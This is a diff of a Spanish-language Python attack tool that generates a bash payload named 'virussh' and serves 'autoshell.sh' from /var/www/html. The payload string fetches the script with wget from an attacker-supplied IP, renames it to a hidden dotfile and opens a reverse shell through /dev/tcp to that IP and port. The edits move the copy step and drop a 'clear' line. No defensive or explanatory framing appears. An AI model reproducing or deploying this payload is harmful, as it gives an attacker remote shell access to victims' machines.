@@ -100,7 +100,6 @@ if numero == 2:
    os.system('cp autoshell.sh /var/www/html') 
 
    virussh = "#!/bin/bash\n"\
-             "clear\n"\
              "wget http://"+ ip +"/autoshell.sh\n"\
              "mv autoshell.sh .autoshell.sh\n"\   
              "bash -i >& /dev/tcp/"+ ip +"/"+ puerto +" 0>&1\n"\
@@ -133,6 +132,7 @@ if numero == 2:
 
                
 if numero == 3:
+    os.system('cp autoshell.sh /var/www/html') 
     ip = input("""
 
     Introduzca su IP
